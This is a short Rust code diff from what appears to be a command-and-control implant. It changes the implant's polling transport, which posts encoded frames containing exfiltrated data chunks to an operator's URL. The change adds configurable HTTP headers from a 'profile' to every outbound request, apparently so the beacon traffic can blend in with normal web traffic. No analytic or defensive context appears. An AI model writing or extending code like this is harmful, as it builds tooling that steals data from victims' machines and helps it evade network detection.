@@ -21,6 +21,7 @@ use crate::wire::{ExfilProgress, Frame, FrameKind, StagedChunk};
 pub struct Poll {
     url: String,
     agent: ureq::Agent,
+    headers: Vec<(String, String)>,
 }
 
 impl Poll {
@@ -28,6 +29,7 @@ impl Poll {
         Poll {
             agent: crate::transport::build_agent(dial, profile, profile.request_timeout_seconds),
             url: dial.to_string(),
+            headers: profile.headers.clone(),
         }
     }
 }
@@ -47,11 +49,13 @@ impl Contact for Poll {
         frames.extend(exfil);
         let (body, content_type) = session.encode_outgoing(&frames);
 
-        let response = self
-            .agent
-            .post(&self.url)
-            .set("Content-Type", content_type)
-            .send_bytes(&body)?;
+        let response = {
+            let mut request = self.agent.post(&self.url).set("Content-Type", content_type);
+            for (name, value) in &self.headers {
+                request = request.set(name, value);
+            }
+            request.send_bytes(&body)?
+        };
         let status = response.status();
         let mut bytes = Vec::new();
         response
